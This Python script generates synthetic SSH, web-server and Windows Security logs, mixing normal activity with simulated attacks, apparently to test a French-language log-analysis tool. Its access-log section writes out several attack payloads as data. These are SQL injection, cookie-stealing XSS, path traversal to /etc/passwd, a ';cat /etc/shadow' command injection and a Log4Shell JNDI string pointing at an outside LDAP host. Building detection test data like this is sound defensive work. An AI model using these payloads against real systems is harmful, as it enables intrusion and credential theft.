#!/usr/bin/env python3
"""Génère des logs d'exemple (trafic normal + attaques) dans ./samples pour tester l'outil.

Scénarios injectés :
  auth.log   : brute-force root, password spraying, brute-force réussi sur « deploy »,
               attaque distribuée sur « admin », connexion d'alice hors horaires depuis une nouvelle IP
  access.log : scan Nikto, énumération de répertoires, injections SQL/XSS/traversée, Log4Shell,
               brute-force wp-login, fichier .env exposé
  windows    : brute-force RDP réussi depuis Internet, création d'un compte ajouté aux admins,
               effacement du journal, spraying interne, verrouillage de compte
"""
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from xml.sax.saxutils import escape

random.seed(42)
OUT = Path(__file__).parent / "samples"
OUT.mkdir(exist_ok=True)
D1 = (datetime.now() - timedelta(days=2)).replace(hour=0, minute=0, second=0, microsecond=0)
D2 = D1 + timedelta(days=1)


def at(day, h, m=0, s=0):
    return day + timedelta(hours=h, minutes=m, seconds=s)


def burst(start, n, min_gap=1, max_gap=4):
    t = start
    for _ in range(n):
        yield t
        t += timedelta(seconds=random.uniform(min_gap, max_gap))


# ============================================================ auth.log
auth = []


def sshd(ts, msg):
    auth.append((ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} srv-web01 sshd[{random.randint(1000, 60000)}]: {msg}"))


def port():
    return random.randint(30000, 65000)


for day in (D1, D2):
    for user, ip in (("alice", "192.168.1.20"), ("bob", "192.168.1.35")):
        for _ in range(5):
            t = at(day, random.randint(8, 18), random.randint(0, 59), random.randint(0, 59))
            if random.random() < 0.2:
                sshd(t - timedelta(seconds=20), f"Failed password for {user} from {ip} port {port()} ssh2")
            sshd(t, f"Accepted publickey for {user} from {ip} port {port()} ssh2: ED25519 SHA256:abc")
    for h in range(0, 24, 6):
        t = at(day, h, 17)
        auth.append((t, f"{t:%b} {t.day:>2} {t:%H:%M:%S} srv-web01 CRON[{random.randint(1000, 9000)}]: "
                        "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"))
    t = at(day, 10, 5)
    auth.append((t, f"{t:%b} {t.day:>2} {t:%H:%M:%S} srv-web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; "
                    "USER=root ; COMMAND=/usr/bin/apt update"))

for t in burst(at(D2, 2, 10), 80):                                      # brute-force root
    sshd(t, f"Failed password for root from 203.0.113.45 port {port()} ssh2")

users = ["admin", "test", "oracle", "postgres", "ubuntu", "guest", "ftp", "user", "git", "jenkins", "pi"]
for t, u in zip(burst(at(D2, 4, 0), len(users), 5, 20), users):         # password spraying
    p = port()
    sshd(t, f"Invalid user {u} from 198.51.100.23 port {p}")
    sshd(t + timedelta(seconds=1), f"Failed password for invalid user {u} from 198.51.100.23 port {p} ssh2")

last = None
for last in burst(at(D2, 13, 30), 35, 2, 6):                            # brute-force réussi
    sshd(last, f"Failed password for deploy from 185.220.101.7 port {port()} ssh2")
sshd(last + timedelta(seconds=3), f"Accepted password for deploy from 185.220.101.7 port {port()} ssh2")

for i in range(8):                                                     # attaque distribuée
    ip = f"103.{40 + i}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    for t in burst(at(D2, 6 + i * 2, random.randint(0, 59)), 4, 30, 120):
        sshd(t, f"Failed password for invalid user admin from {ip} port {port()} ssh2")

sshd(at(D2, 22, 47, 12), f"Accepted password for alice from 45.83.12.9 port {port()} ssh2")  # anomalie

auth.sort()
(OUT / "auth.log").write_text("\n".join(l for _, l in auth) + "\n", encoding="utf-8")

# ============================================================ access.log
web = []
BROWSERS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"]


def req(ts, ip, method, path, status, size=None, ua=None, ref="-"):
    size = size if size is not None else (random.randint(200, 40000) if status == 200 else random.randint(150, 600))
    z = ts.astimezone().strftime("%z")
    web.append((ts, f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} {z}] "{method} {path} HTTP/1.1" {status} {size} '
                    f'"{ref}" "{ua or random.choice(BROWSERS)}"'))


PAGES = ["/", "/index.html", "/about", "/contact", "/blog/", "/blog/article-1", "/blog/article-2",
         "/css/style.css", "/js/app.js", "/img/logo.png"]
visitors = [f"{random.choice([81, 82, 86, 90, 176, 109])}.{random.randint(1, 254)}.{random.randint(1, 254)}."
            f"{random.randint(1, 254)}" for _ in range(40)]
for day in (D1, D2):
    for _ in range(350):
        t = at(day, random.choices(range(24), weights=[1] * 7 + [6] * 13 + [2] * 4)[0],
               random.randint(0, 59), random.randint(0, 59))
        status = random.choices([200, 304, 404], weights=[85, 12, 3])[0]
        req(t, random.choice(visitors), "GET", random.choice(PAGES) if status != 404 else "/favicon.ico", status)

NIKTO = ["/admin/", "/phpmyadmin/", "/.git/config", "/.env", "/backup.sql", "/config.php.bak", "/server-status",
         "/cgi-bin/test.cgi", "/wp-config.php.old", "/.htpasswd", "/test.php", "/info.php", "/shell.php"]
for i, t in enumerate(burst(at(D2, 1, 0), 120, 0.2, 1)):                 # Nikto
    req(t, "192.0.2.10", "GET", NIKTO[i % len(NIKTO)] + ("" if i < len(NIKTO) else f"?{i}"),
        403 if i % 9 == 0 else 404, ua=f"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:{i:06d})")

WORDS = ["admin", "backup", "old", "dev", "test", "api", "private", "uploads", "tmp", "files", "secret", "db",
         "staging", "panel", "dashboard", "cpanel", "webadmin", "logs", "data", "config"]
for i, t in enumerate(burst(at(D2, 9, 15), 200, 0.1, 0.6)):             # énumération
    w = WORDS[i % len(WORDS)]
    req(t, "203.0.113.99", "GET", f"/{w}{i // len(WORDS) or ''}/", 404,
        ua="Mozilla/5.0 (X11; Linux x86_64)")

ATTACKS = ["/products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--",
           "/products.php?id=1%27%20OR%20%271%27=%271",
           "/products.php?id=1%20AND%20SLEEP(5)",
           "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
           "/search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E",
           "/download?file=../../../../etc/passwd",
           "/ping?host=127.0.0.1;cat%20/etc/shadow"]
for i, t in enumerate(burst(at(D2, 11, 0), 21, 3, 15)):                 # injections
    req(t, "198.51.100.77", "GET", ATTACKS[i % len(ATTACKS)], random.choice([200, 500, 403]),
        ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

req(at(D2, 7, 42), "45.95.147.236", "GET", "/", 200, ua="${jndi:ldap://45.95.147.236:1389/Exploit}")  # Log4Shell

for t in burst(at(D2, 15, 0), 50, 2, 5):                               # wp-login
    req(t, "45.155.205.3", "POST", "/wp-login.php", 200, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        ref="https://www.example.com/wp-login.php")

for t, (p, s) in zip(burst(at(D2, 5, 30), 4, 1, 3),                    # .env exposé
                     [("/.env", 200), ("/.git/config", 200), ("/wp-config.php.bak", 404), ("/phpmyadmin/", 404)]):
    req(t, "91.240.118.50", "GET", p, s, size=512 if s == 200 else None, ua="curl/8.4.0")

web.sort()
(OUT / "access.log").write_text("\n".join(l for _, l in web) + "\n", encoding="utf-8")

# ============================================================ Windows Security (XML wevtutil)
win, rid = [], [100000]


def wevent(ts, eid, data, user_data=None):
    rid[0] += 1
    st = ts.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f") + "0Z"
    body = (f"<UserData>{user_data}</UserData>" if user_data else
            "<EventData>" + "".join(f"<Data Name='{k}'>{escape(str(v))}</Data>" for k, v in data.items()) + "</EventData>")
    win.append((ts, "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
                    "<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/>"
                    f"<EventID>{eid}</EventID><Version>2</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>"
                    f"<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='{st}'/>"
                    f"<EventRecordID>{rid[0]}</EventRecordID><Correlation/><Execution ProcessID='716' ThreadID='{random.randint(800, 9000)}'/>"
                    f"<Channel>Security</Channel><Computer>SRV-FILES01.corp.local</Computer><Security/></System>{body}</Event>"))


def logon(ts, user, ip, lt, ok=True):
    d = {"SubjectUserSid": "S-1-5-18", "SubjectUserName": "SRV-FILES01$", "TargetUserName": user,
         "TargetDomainName": "CORP", "LogonType": lt, "WorkstationName": "PC-" + user.upper()[:6],
         "IpAddress": ip, "IpPort": random.randint(49152, 65000)}
    if not ok:
        d |= {"Status": "0xc000006d", "SubStatus": "0xc000006a"}
    wevent(ts, 4624 if ok else 4625, d)


staff = {"jdupont": "10.0.0.21", "mmartin": "10.0.0.22", "sleroy": "10.0.0.23"}
for day in (D1, D2):
    for user, ip in staff.items():
        for _ in range(6):
            logon(at(day, random.randint(8, 18), random.randint(0, 59)), user, ip, random.choice([2, 3]))
    for h in range(0, 24, 3):
        logon(at(day, h, 1), "SYSTEM", "-", 5)                          # bruit filtré

for t in burst(at(D2, 3, 0), 45, 1, 3):                                # brute-force RDP
    logon(t, "Administrateur", "80.94.95.12", 10, ok=False)
logon(t + timedelta(seconds=4), "Administrateur", "80.94.95.12", 10)
wevent(at(D2, 3, 20), 4720, {"TargetUserName": "svc_maint", "TargetDomainName": "CORP",
                              "SubjectUserName": "Administrateur", "SubjectDomainName": "CORP"})
wevent(at(D2, 3, 21), 4732, {"MemberName": "CN=svc_maint,CN=Users,DC=corp,DC=local", "TargetUserName": "Administrateurs",
                              "TargetDomainName": "BUILTIN", "SubjectUserName": "Administrateur"})
wevent(at(D2, 3, 35), 1102, {}, user_data=(
    "<LogFileCleared xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>"
    "<SubjectUserSid>S-1-5-21-1-500</SubjectUserSid><SubjectUserName>Administrateur</SubjectUserName>"
    "<SubjectDomainName>CORP</SubjectDomainName><SubjectLogonId>0x3e7</SubjectLogonId></LogFileCleared>"))

spray = ["jdupont", "mmartin", "sleroy", "pdurand", "lbernard", "cpetit", "nrobert", "arichard", "comptable", "rh"]
for t, u in zip(burst(at(D2, 16, 10), len(spray), 2, 8), spray):       # spraying interne
    logon(t, u, "10.0.0.66", 3, ok=False)
for t in burst(at(D2, 9, 30), 6, 5, 20):                               # verrouillage
    logon(t, "mmartin", "10.0.0.22", 2, ok=False)
wevent(t + timedelta(seconds=2), 4740, {"TargetUserName": "mmartin", "TargetDomainName": "CORP",
                                         "SubjectUserName": "DC01$"})

win.sort()
(OUT / "windows_security.xml").write_text("".join(x for _, x in win), encoding="utf-8")

print(f"Logs d'exemple générés dans {OUT}/ : auth.log ({len(auth)} lignes), "
      f"access.log ({len(web)} lignes), windows_security.xml ({len(win)} événements)")
